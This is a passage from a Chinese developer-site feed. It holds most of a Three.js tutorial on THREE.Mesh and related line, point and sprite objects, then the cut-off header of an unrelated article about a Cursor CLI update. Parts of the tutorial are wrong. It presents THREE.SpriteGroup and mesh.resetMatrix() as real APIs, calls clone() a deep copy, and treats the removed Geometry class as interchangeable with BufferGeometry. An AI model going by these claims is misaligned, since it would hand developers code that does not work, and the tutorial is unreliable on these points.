<li><strong>几何体类型兼容</strong>：<code>THREE.Mesh</code> 仅支持「面几何体」（有体积、有面的几何体），不支持线、点类几何体；</li>
<li><strong>版本提示</strong>：Three.js <code>r125+</code> 版本后，<strong>推荐使用 BufferGeometry</strong> 替代旧的 Geometry，前者性能更高，是官方主推的几何体类型，二者用法一致。</li>
</ol>
<hr/>
<h3 data-id="heading-10">二、THREE.Mesh 核心公共属性 &amp; 方法</h3>
<p><code>THREE.Mesh</code> 继承自 <code>THREE.Object3D</code>，拥有<strong>所有3D对象通用的核心属性和方法</strong>，这些是你操控3D物体的<strong>核心API</strong>，<strong>所有网格/渲染对象都共用</strong>，必学必记，无例外！</p>
<blockquote>
<p>所有属性支持「创建后动态修改」，修改后立即生效，无需重新创建Mesh。</p>
</blockquote>
<h4 data-id="heading-11">2.1 三大核心变换属性（位置、旋转、缩放，最常用TOP3）</h4>
<h5 data-id="heading-12">① 位置属性 <code>position</code> → 控制物体在场景中的坐标</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 类型：THREE.Vector3 对象，默认值 (0, 0, 0) 场景原点</span>
mesh.<span class="hljs-property">position</span>.<span class="hljs-property">x</span> = <span class="hljs-number">2</span>; <span class="hljs-comment">// X轴向右移动2个单位</span>
mesh.<span class="hljs-property">position</span>.<span class="hljs-property">y</span> = -<span class="hljs-number">1</span>; <span class="hljs-comment">// Y轴向下移动1个单位</span>
mesh.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> = <span class="hljs-number">3</span>; <span class="hljs-comment">// Z轴向外移动3个单位</span>
<span class="hljs-comment">// 批量设置：x, y, z</span>
mesh.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">2</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">3</span>);
</code></pre>
<h5 data-id="heading-13">② 旋转属性 <code>rotation</code> → 控制物体的旋转角度</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 类型：THREE.Euler 对象，默认值 (0, 0, 0)，单位是「弧度」不是角度！</span>
mesh.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">2</span>; <span class="hljs-comment">// 绕X轴旋转90°</span>
mesh.<span class="hljs-property">rotation</span>.<span class="hljs-property">y</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>; <span class="hljs-comment">// 绕Y轴旋转180°</span>
mesh.<span class="hljs-property">rotation</span>.<span class="hljs-property">z</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">4</span>; <span class="hljs-comment">// 绕Z轴旋转45°</span>
<span class="hljs-comment">// 批量设置：x, y, z 弧度值</span>
mesh.<span class="hljs-property">rotation</span>.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>/<span class="hljs-number">2</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>/<span class="hljs-number">4</span>);
<span class="hljs-comment">// 角度转弧度小技巧：角度值 * Math.PI / 180</span>
mesh.<span class="hljs-property">rotation</span>.<span class="hljs-property">y</span> = <span class="hljs-number">45</span> * <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> / <span class="hljs-number">180</span>; <span class="hljs-comment">// 绕Y轴旋转45°</span>
</code></pre>
<h5 data-id="heading-14">③ 缩放属性 <code>scale</code> → 控制物体的大小缩放</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 类型：THREE.Vector3 对象，默认值 (1, 1, 1) 原始尺寸</span>
mesh.<span class="hljs-property">scale</span>.<span class="hljs-property">x</span> = <span class="hljs-number">2</span>; <span class="hljs-comment">// X轴放大2倍</span>
mesh.<span class="hljs-property">scale</span>.<span class="hljs-property">y</span> = <span class="hljs-number">0.5</span>; <span class="hljs-comment">// Y轴缩小为原来的0.5倍</span>
<span class="hljs-comment">// 批量设置：等比缩放/非等比缩放</span>
mesh.<span class="hljs-property">scale</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">2</span>, <span class="hljs-number">0.5</span>, <span class="hljs-number">1</span>); <span class="hljs-comment">// X放大2倍，Y缩小0.5倍，Z不变</span>
mesh.<span class="hljs-property">scale</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-number">3</span>); <span class="hljs-comment">// 整体等比放大3倍</span>
</code></pre>
<h4 data-id="heading-15">2.2 高频基础属性</h4>
<pre><code class="hljs language-javascript" lang="javascript">mesh.<span class="hljs-property">visible</span> = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 布尔值，默认true，是否显示该物体；false则隐藏，不参与渲染</span>
mesh.<span class="hljs-property">name</span> = <span class="hljs-string">"cube"</span>; <span class="hljs-comment">// 字符串，给物体命名，可通过 scene.getObjectByName("cube") 获取该物体</span>
mesh.<span class="hljs-property">userData</span> = {<span class="hljs-attr">id</span>:<span class="hljs-number">1</span>, <span class="hljs-attr">type</span>:<span class="hljs-string">"cube"</span>}; <span class="hljs-comment">// 自定义数据，存储业务相关信息，不影响渲染</span>
mesh.<span class="hljs-property">matrixAutoUpdate</span> = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 布尔值，默认true，自动更新变换矩阵；手动控制矩阵时设为false</span>
</code></pre>
<h4 data-id="heading-16">2.3 光影相关核心属性（实现阴影必备）</h4>
<pre><code class="hljs language-javascript" lang="javascript">mesh.<span class="hljs-property">castShadow</span> = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 布尔值，默认false，该物体是否「投射阴影」到其他物体上</span>
mesh.<span class="hljs-property">receiveShadow</span> = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 布尔值，默认false，该物体是否「接收」其他物体投射的阴影</span>
</code></pre>
<blockquote>
<p>注意：开启阴影后，还需要开启「光源的阴影投射」+「渲染器的阴影支持」才能生效。</p>
</blockquote>
<h4 data-id="heading-17">2.4 核心常用方法</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. 让物体始终朝向某个目标点/物体</span>
mesh.<span class="hljs-title function_">lookAt</span>(<span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)); <span class="hljs-comment">// 朝向场景原点</span>
mesh.<span class="hljs-title function_">lookAt</span>(camera.<span class="hljs-property">position</span>); <span class="hljs-comment">// 朝向相机位置</span>

<span class="hljs-comment">// 2. 给物体添加子物体（父子层级关系）</span>
<span class="hljs-keyword">const</span> childMesh = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(geo, mat);
mesh.<span class="hljs-title function_">add</span>(childMesh); <span class="hljs-comment">// childMesh成为mesh的子物体，继承父物体的位置/旋转/缩放</span>

<span class="hljs-comment">// 3. 移除子物体</span>
mesh.<span class="hljs-title function_">remove</span>(childMesh);

<span class="hljs-comment">// 4. 克隆当前物体（深拷贝，包含几何体、材质、所有属性）</span>
<span class="hljs-keyword">const</span> meshClone = mesh.<span class="hljs-title function_">clone</span>();
scene.<span class="hljs-title function_">add</span>(meshClone);

<span class="hljs-comment">// 5. 清除物体的所有变换（位置归零、旋转归零、缩放还原）</span>
mesh.<span class="hljs-title function_">resetMatrix</span>();
</code></pre>
<hr/>
<h3 data-id="heading-18">三、Three.js 中「所有网格/渲染对象」分类大全（完整8类，含参数+用途）</h3>
<p>Three.js 提供的<strong>所有可视化渲染对象</strong> —— <code>THREE.Mesh</code> 只是「立体实体」的核心，Three.js 为了满足不同的可视化需求，提供了<strong>8类专用的网格/渲染对象</strong>，全部继承自 <code>THREE.Object3D</code>，共用上述所有公共属性和方法，只是<strong>渲染形态、适用场景、创建参数不同</strong>。</p>
<h4 data-id="heading-19">核心分类原则</h4>
<p>所有渲染对象按「渲染形态」分为四大类：<strong>实体类、线类、点类、精灵类</strong>，以下按「使用率从高到低」排序，全部整理了 <strong>创建语法、完整参数、核心特点、适用场景</strong></p>
<hr/>
<h4 data-id="heading-20">第一类：实体类渲染对象（核心，立体有体积，共2个）</h4>
<h5 data-id="heading-21">1. THREE.Mesh（上文详解，使用率 99%）</h5>
<ul>
<li>核心：渲染<strong>实心立体几何体</strong>，带面、带体积，支持所有材质；</li>
<li>适用：所有3D实体模型（立方体、球体、圆柱、自定义模型）；</li>
<li>创建：<code>new THREE.Mesh(geometry, material)</code>。</li>
</ul>
<h5 data-id="heading-22">2. THREE.SkinnedMesh（骨骼蒙皮网格，进阶）</h5>
<ul>
<li>核心：<code>THREE.Mesh</code> 的子类，支持<strong>骨骼绑定+蒙皮动画</strong>，可以让模型实现关节弯曲、人物行走等骨骼动画；</li>
<li>适用：人物模型、动物模型、有骨骼动画的3D角色；</li>
<li>创建语法 &amp; 参数：
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 语法：new THREE.SkinnedMesh(几何体, 材质, 骨骼数组(可选))</span>
<span class="hljs-keyword">const</span> skinnedMesh = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">SkinnedMesh</span>(geometry, material, bones);
</code></pre>
</li>
<li>特点：比普通Mesh多了骨骼相关的属性和方法，是实现3D角色动画的核心。</li>
</ul>
<hr/>
<h4 data-id="heading-23">第二类：线类渲染对象（纯线条，无面无体积，共3个）</h4>
<blockquote>
<p>所有线类对象，<strong>必须搭配「线材质」</strong>：<code>LineBasicMaterial</code>(实线) / <code>LineDashedMaterial</code>(虚线)，不能使用Mesh系列材质！
核心特点：只渲染几何体的「棱边/顶点连线」，无面、无体积，性能极高，适合绘制轮廓、辅助线、轨迹线等。</p>
</blockquote>
<h5 data-id="heading-24">1. THREE.Line（连续线条，使用率最高）</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 语法：new THREE.Line(几何体, 材质)</span>
<span class="hljs-comment">// 几何体：必须是 BufferGeometry，顶点按顺序连成「一条连续的折线」</span>
<span class="hljs-keyword">const</span> lineGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BufferGeometry</span>().<span class="hljs-title function_">setFromPoints</span>([
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>),
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>),
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>)
]);
<span class="hljs-keyword">const</span> lineMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineBasicMaterial</span>({<span class="hljs-attr">color</span>:<span class="hljs-number">0xff0000</span>});
<span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Line</span>(lineGeometry, lineMaterial);
scene.<span class="hljs-title function_">add</span>(line);
</code></pre>
<ul>
<li>特点：顶点按传入顺序<strong>首尾相连成连续线条</strong>，最后一个顶点不闭合到起点；</li>
<li>适用：折线、轨迹线、连接线、电路图等。</li>
</ul>
<h5 data-id="heading-25">2. THREE.LineSegments（分段线条）</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 语法：new THREE.LineSegments(几何体, 材质)</span>
<span class="hljs-comment">// 特点：顶点按「两两一组」渲染成独立的线段，组与组之间不连接</span>
<span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineSegments</span>(geometry, material);
</code></pre>
<ul>
<li>适用：网格辅助线、坐标轴、虚线框、多段独立线条等。</li>
</ul>
<h5 data-id="heading-26">3. THREE.LineLoop（闭合线条）</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 语法：new THREE.LineLoop(几何体, 材质)</span>
<span class="hljs-comment">// 特点：顶点按顺序连成连续线条，「最后一个顶点会闭合到第一个顶点」，形成封闭图形</span>
<span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineLoop</span>(geometry, material);
</code></pre>
<ul>
<li>适用：圆形轮廓、正方形边框、封闭轨迹线等。</li>
</ul>
<blockquote>
<p>线类必看注意点：使用 <code>LineDashedMaterial</code>(虚线材质) 时，必须给几何体执行 <code>geometry.computeLineDistances()</code>，否则虚线不生效！</p>
</blockquote>
<hr/>
<h4 data-id="heading-27">第三类：点/粒子类渲染对象（纯点，共1个）</h4>
<h5 data-id="heading-28">THREE.Points（粒子/点云模型）</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 语法：new THREE.Points(几何体, 材质)</span>
<span class="hljs-comment">// 核心：必须搭配「点材质」PointsMaterial，不能使用其他材质</span>
<span class="hljs-keyword">const</span> pointsArr = [];
<span class="hljs-keyword">const</span> count = <span class="hljs-number">1000</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; count; i++) {
     <span class="hljs-keyword">const</span> x = (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() - <span class="hljs-number">0.5</span>) * <span class="hljs-number">10</span>; <span class="hljs-comment">// -5 ～ +5</span>
    <span class="hljs-keyword">const</span> y = (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() - <span class="hljs-number">0.5</span>) * <span class="hljs-number">10</span>;
    <span class="hljs-keyword">const</span> z = (<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() - <span class="hljs-number">0.5</span>) * <span class="hljs-number">10</span>;
    pointsArr.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(x, y, z));
}
<span class="hljs-keyword">const</span> pointsGeometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BufferGeometry</span>().<span class="hljs-title function_">setFromPoints</span>(pointsArr); <span class="hljs-comment">// pointsArr是顶点数组</span>
<span class="hljs-keyword">const</span> pointsMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PointsMaterial</span>({<span class="hljs-attr">color</span>:<span class="hljs-number">0xffffff</span>, <span class="hljs-attr">size</span>:<span class="hljs-number">2</span>});
<span class="hljs-keyword">const</span> points = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Points</span>(pointsGeometry, pointsMaterial);
scene.<span class="hljs-title function_">add</span>(points);
</code></pre>
<ul>
<li>核心特点：渲染几何体的<strong>每个顶点为一个独立的点/粒子</strong>，无面、无线条，仅显示点；</li>
<li>材质专属：只能用 <code>THREE.PointsMaterial</code>，支持粒子大小、颜色、透明度、纹理贴图；</li>
<li>适用场景：<strong>粒子特效</strong>（星空、雪花、雨滴、烟雾、火焰）、点云模型、数据可视化散点图等。</li>
</ul>
<hr/>
<h4 data-id="heading-29">第四类：精灵类渲染对象（2D平面，始终朝相机，共2个）</h4>
<h5 data-id="heading-30">1. THREE.Sprite（精灵模型）</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 语法：new THREE.Sprite(材质) → 无需几何体！</span>
<span class="hljs-keyword">const</span> spriteMaterial = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">SpriteMaterial</span>({<span class="hljs-attr">color</span>:<span class="hljs-number">0xff0000</span>, <span class="hljs-attr">transparent</span>:<span class="hljs-literal">true</span>});
<span class="hljs-keyword">const</span> sprite = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Sprite</span>(spriteMaterial);
scene.<span class="hljs-title function_">add</span>(sprite);
</code></pre>
<ul>
<li>核心特点：<strong>无需几何体</strong>，本质是一个「无限薄的2D正方形平面」，<strong>无论相机如何旋转，始终正面朝向相机</strong>；</li>
<li>材质专属：必须搭配 <code>THREE.SpriteMaterial</code> 精灵材质；</li>
<li>大小控制：通过 <code>sprite.scale.set(width, height, 1)</code> 控制尺寸；</li>
<li>适用场景：3D场景中的2D元素（图标、血条、标签、子弹、火焰粒子、雪花）。</li>
</ul>
<h5 data-id="heading-31">2. THREE.SpriteGroup（精灵组，进阶）</h5>
<ul>
<li>核心：批量渲染多个Sprite，<strong>性能极高</strong>，适合创建大量精灵（如10000个雪花、雨滴）；</li>
<li>语法：<code>new THREE.SpriteGroup(material, {size:1000})</code>；</li>
<li>适用：大规模粒子特效、海量精灵渲染。</li>
</ul>
<hr/>
<h3 data-id="heading-32">四、补充：特殊「网格相关」知识点</h3>
<h4 data-id="heading-33">4.1 关于「BufferGeometry 优先使用」的说明</h4>
<p>Three.js 中有两种几何体：<code>Geometry</code>（旧版） 和 <code>BufferGeometry</code>（新版），二者都能传给Mesh/Line/Points，但：</p>
<ul>
<li>推荐：<strong>所有场景优先使用 BufferGeometry</strong>，它是官方主推的几何体类型；</li>
<li>优势：<code>BufferGeometry</code> 对GPU更友好，内存占用更少，渲染性能更高，支持所有新特性；</li>
<li>兼容：所有网格对象对两种几何体的支持完全一致，用法无区别，只是创建方式不同。</li>
</ul>
<h4 data-id="heading-34">4.2 网格模型的性能优化核心技巧</h4>
<ol>
<li><strong>复用几何体和材质</strong>：同一个几何体/材质，尽量给多个网格对象复用，减少内存占用；</li>
<li><strong>减少分段数</strong>：几何体的分段数越高，顶点越多，渲染越慢，够用即可（如球体32段足够平滑）；</li>
<li><strong>批量渲染</strong>：大量相同的简单物体，使用 <code>InstancedMesh</code>（实例化网格）替代多个Mesh，性能提升百倍；</li>
<li><strong>隐藏不可见物体</strong>：对屏幕外的物体设置 <code>visible=false</code>，减少渲染计算；</li>
<li><strong>减少阴影开启</strong>：阴影渲染性能开销大，非必要场景关闭 <code>castShadow/receiveShadow</code>。</li>
</ol>
<h4 data-id="heading-35">4.3 易混淆概念区分</h4>
<ol>
<li>误区：<code>THREE.Mesh</code> 是唯一的网格模型 →  正确：<code>Mesh</code> 只是「实体网格」，还有线、点、精灵等专用渲染对象；</li>
<li>误区：线类对象可以用Mesh材质 →  正确：线类必须用线材质，点类必须用点材质，精灵必须用精灵材质，<strong>材质和渲染对象是一一对应的</strong>；</li>
<li>误区：Sprite需要几何体 →  正确：Sprite无需几何体，是自带2D平面的渲染对象。</li>
</ol>
<hr/>
<h3 data-id="heading-36">五、完整的「Mesh创建+使用」示例代码</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 官网地址</span>
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-variable constant_">THREE</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'https://threejsfundamentals.org/threejs/resources/threejs/r132/build/three.module.js'</span>
<span class="hljs-comment">// 1. 创建三大核心</span>
<span class="hljs-comment">//场景</span>
<span class="hljs-keyword">const</span> scene = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Scene</span>();
<span class="hljs-comment">//透视相机</span>
<span class="hljs-keyword">const</span> camera = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">PerspectiveCamera</span>(<span class="hljs-number">75</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>/<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">1000</span>);
<span class="hljs-comment">//相机默认创建在场景的**坐标原点 (0,0,0)**，与场景中心重合，此时会和几何体重叠导致看不到内容，**必须手动调整相机位置**，最常用的就是调整Z轴让相机「后退」：</span>
<span class="hljs-comment">// 相机沿Z轴向后移动5个单位，即可看到场景中心的物体</span>
camera.<span class="hljs-property">position</span>.<span class="hljs-property">z</span> = <span class="hljs-number">5</span>;

<span class="hljs-comment">//渲染器</span>
<span class="hljs-keyword">const</span> renderer = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">WebGLRenderer</span>();
<span class="hljs-comment">// 设置渲染画布的尺寸（与浏览器窗口一致，满屏显示）</span>
renderer.<span class="hljs-title function_">setSize</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">innerWidth</span>, <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span>);
<span class="hljs-comment">// 将渲染器生成的canvas画布，添加到HTML页面中</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(renderer.<span class="hljs-property">domElement</span>);

<span class="hljs-comment">// 2. 创建几何体+材质</span>
<span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BoxGeometry</span>(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>); <span class="hljs-comment">// 立方体几何体</span>
<span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">MeshStandardMaterial</span>({<span class="hljs-attr">color</span>:<span class="hljs-number">0x00ff00</span>, <span class="hljs-attr">roughness</span>:<span class="hljs-number">0.5</span>, <span class="hljs-attr">metalness</span>:<span class="hljs-number">0.2</span>}); <span class="hljs-comment">// PBR材质</span>

<span class="hljs-comment">// 3. 创建核心网格模型Mesh</span>
<span class="hljs-keyword">const</span> cubeMesh = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Mesh</span>(geometry, material);
<span class="hljs-comment">// 设置Mesh属性</span>
cubeMesh.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 位置</span>
cubeMesh.<span class="hljs-property">rotation</span>.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>/<span class="hljs-number">4</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>/<span class="hljs-number">4</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// 旋转</span>
cubeMesh.<span class="hljs-property">scale</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>); <span class="hljs-comment">// 缩放</span>
cubeMesh.<span class="hljs-property">castShadow</span> = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 投射阴影</span>
cubeMesh.<span class="hljs-property">name</span> = <span class="hljs-string">"cube"</span>; <span class="hljs-comment">// 命名</span>

<span class="hljs-comment">// 4. 添加到场景</span>
scene.<span class="hljs-title function_">add</span>(cubeMesh);

<span class="hljs-comment">// 5. 添加光源（PBR材质必须加光源）</span>
<span class="hljs-keyword">const</span> ambientLight = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">AmbientLight</span>(<span class="hljs-number">0xffffff</span>, <span class="hljs-number">0.5</span>);
<span class="hljs-keyword">const</span> dirLight = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">DirectionalLight</span>(<span class="hljs-number">0xffffff</span>, <span class="hljs-number">1</span>);
dirLight.<span class="hljs-property">position</span>.<span class="hljs-title function_">set</span>(<span class="hljs-number">5</span>,<span class="hljs-number">5</span>,<span class="hljs-number">5</span>);
dirLight.<span class="hljs-property">castShadow</span> = <span class="hljs-literal">true</span>;
scene.<span class="hljs-title function_">add</span>(ambientLight, dirLight);

<span class="hljs-comment">// 6. 动画循环</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">animate</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">requestAnimationFrame</span>(animate);
  cubeMesh.<span class="hljs-property">rotation</span>.<span class="hljs-property">x</span> += <span class="hljs-number">0.01</span>;
  cubeMesh.<span class="hljs-property">rotation</span>.<span class="hljs-property">y</span> += <span class="hljs-number">0.01</span>;
  renderer.<span class="hljs-title function_">render</span>(scene, camera);
}
<span class="hljs-title function_">animate</span>();

</code></pre>
<hr/>
<h3 data-id="heading-37">核心知识总结</h3>
<ol>
<li><strong>核心关系</strong>：几何体(形状)+材质(外观) → Mesh(实体对象)，Mesh是3D实体的最终载体；</li>
<li><strong>网格体系</strong>：Three.js的可视化对象分4类 → 实体(Mesh/SkinnedMesh)、线(Line/LineSegments)、点(Points)、精灵(Sprite)；</li>
<li><strong>三大变换</strong>：所有网格对象共用 <code>position</code>(位置)、<code>rotation</code>(旋转)、<code>scale</code>(缩放)，是操控物体的核心；</li>
<li><strong>材质匹配</strong>：实体用Mesh材质，线用线材质，点用点材质，精灵用精灵材质，一一对应；</li>
<li><strong>性能优先</strong>：优先用BufferGeometry，复用几何体/材质，减少分段数，提升渲染效率。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Cursor CLI重磅更新！]]></title>    <link>https://juejin.cn/post/7596845113282002953</link>    <guid>https://juejin.cn/post/7596845113282002953</guid>    <pubDate>2026-01-20T00:33:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596845113282002953" data-draft-id="7595808703074484250" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Cursor CLI重磅更新！"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-01-20T00:33:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="golang学习记"/> <meta itemprop="url" content="https://juejin.cn/user/4371313964100990"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Cursor CLI重磅更新！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4371313964100990/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    golang学习记
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T00:33:59.000Z" title="Tue Jan 20 2026 00:33:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
